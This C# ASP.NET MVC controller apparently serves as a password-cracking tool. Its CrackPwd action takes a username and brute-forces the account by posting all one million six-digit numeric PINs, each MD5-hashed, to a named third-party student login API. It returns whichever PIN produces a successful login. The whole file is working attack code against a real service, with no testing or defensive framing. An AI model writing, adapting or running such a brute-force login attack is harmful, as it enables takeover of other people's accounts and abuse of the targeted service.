using BaseCSharp;
using PracticeProgram;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Web;
using System.Web.Mvc;

namespace PracticeWeb.Controllers
{
    public class GetInfoController : Controller
    {
        // GET: GetInfo
        public ActionResult Index()
        {
            return View("CrackPassword");
        }

        /// <summary>
        /// /GetInfo/CrackPwd
        /// </summary>
        /// <returns></returns>
        public ActionResult CrackPwd()
        {
            string uid = Request.Form["uid"];
            if (string.IsNullOrWhiteSpace(uid))
            {
                return null;
            }
            HttpHelper http = new HttpHelper();
            string result = "未破解成功";
            //string pwd = EncriptHelper.MD5Encrypt32("");
            string url = "http://api.yiboshi.com/api/study/student/login";


            for (int k = 0; k < 1000000; k++)
            {
                string pwd = k + "";
                for (int m = pwd.Length; m < 6; m++)
                {
                    pwd = "0" + pwd;
                }
                string tempPwd = pwd;
                pwd = EncriptHelper.MD5Encrypt32(pwd);
                Dictionary<string, string> paramList = new Dictionary<string, string>()
                         {
                            { "username",uid},
                            { "password",pwd}
                        };
                string loginResult = http.SendPost(url, paramList);
                if (loginResult.Contains("studentInfo"))
                {
                    result = tempPwd;
                    break;
                }


            }
            
            return Content(result);
        }
    }
}